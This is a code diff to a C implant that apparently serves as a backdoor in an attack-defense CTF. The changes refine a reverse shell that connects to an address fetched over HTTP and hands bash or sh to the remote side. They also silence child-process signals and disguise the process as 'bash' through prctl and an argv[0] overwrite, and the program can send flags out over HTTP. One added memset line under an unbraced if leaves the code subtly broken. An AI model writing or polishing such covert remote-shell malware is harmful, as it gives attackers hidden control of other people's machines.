@@ -93,7 +93,7 @@ char* getProcessInfo() {
 
 void jsonStringsEscape(const char *src, char *dst, size_t dst_size) {
     size_t j = 0;
-    for (size_t i = 0; src[i] && j < dst_size - 2; i++) {
+    for (size_t i = 0; src[i] && j < dst_size - 3; i++) {
         switch (src[i]) {
             case '"':
             case '\\':
@@ -122,8 +122,8 @@ void initiateDirectReverseShell(char *reverseShellInfo) {
 
     char *ip;
     char *port;
-    ip = strtok(reverseShellInfo, "|");
-    port = strtok(NULL, "|");
+    ip = strtok(reverseShellInfo, ":");
+    port = strtok(NULL, ":");
     if (!ip || !port) return;
 
     LOG_DEBUG("[initiateDirectReverseShell]: Initiated reverse shell to %s:%s\n", ip, port);
@@ -137,12 +137,14 @@ void initiateDirectReverseShell(char *reverseShellInfo) {
     sa.sin_port = htons(atoi(port));
     sa.sin_addr.s_addr = inet_addr(ip);
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
-    connect(sockt, (struct sockaddr *) &sa, sizeof(sa));
+    if (sockt < 0) _exit(1);
+    if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) < 0) _exit(1);
     dup2(sockt, 0);
     dup2(sockt, 1);
     dup2(sockt, 2);
     if (execlp("bash", "bash", NULL))
         execlp("sh", "sh", NULL);
+    _exit(1); // 确保正确退出不接着运行
 }
 
 int httpSendFlag(const char *flag) {
@@ -213,9 +215,14 @@ char* httpGetRevshellAddr() {
 
 static void setupSignal(int signum) {
     struct sigaction sa;
-    sa.sa_handler = SIG_IGN;
+    if (signum == SIGCHLD) {
+        sa.sa_handler = SIG_IGN;
+        sa.sa_flags = SA_NOCLDWAIT;
+    } else {
+        sa.sa_handler = SIG_IGN;
+        sa.sa_flags = 0;
+    }
     sigemptyset(&sa.sa_mask);
-    sa.sa_flags = 0;
     sigaction(signum, &sa, NULL);
 }
 
@@ -259,9 +266,10 @@ int main(int argc, char *argv[]) {
     daemonize();
 
     // 修改进程名 (只能16字节,内核task_struct字段, 非root也能)
-    prctl(PR_SET_NAME, "bash", 0,0,0);
+    prctl(PR_SET_NAME, "bash", 0, 0, 0);
     int orig_len = strlen(argv[0]) + 1;
     if (orig_len >= sizeof(new_name))
+        memset(argv[0], 0, strlen(argv[0]));
         strncpy(argv[0], "bash", orig_len);
 
     unsigned ticks = 60;
